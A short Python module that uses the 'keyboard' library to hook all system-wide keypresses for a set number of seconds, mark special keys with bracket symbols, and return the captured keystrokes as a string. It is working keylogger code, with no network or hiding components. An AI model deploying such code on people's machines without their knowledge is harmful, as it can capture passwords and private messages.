import keyboard
from keyboard import KeyboardEvent
import time

spec_key = {
    key: f'⌠{key}⌡'
    for key in [
        'ctrl', 'shift', 'tab',
        'esc', 'left windows', 'print screen',
        'end', 'delete', 'f1', 'f2', 'f3', 'f4',
        'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
        'insert', 'down', 'page down',
        'right', 'clear', 'left',
        'home', 'up', 'num lock',
        'backspace', 'enter', 'right shift',
        'page up', 'space', 'alt',
        'caps lock', 'right alt', 'right ctrl',
    ]
}

spec_key['space'] = ' '

def __parse_key_event(event: KeyboardEvent):
    if event.event_type == keyboard.KEY_UP:
        return ""
    res = str(event.name)
    if res in spec_key:
        res = spec_key[res]
    return res


def __key_log(duration):
    logger = []

    def on_key_event(event):
        key = __parse_key_event(event)
        if key:
            logger.append(key)
    keyboard.hook(on_key_event)
    time.sleep(duration)
    keyboard.unhook_all()
    key = ''.join(logger)
    return key


def get_key_log(duration):
    duration = int(duration)
    content = __key_log(duration)
    return content

# Example usage:
# duration = 10  # Duration in seconds
# key_logs = get_key_log(duration)
# print(key_logs)  # Or use the key_logs variable as needed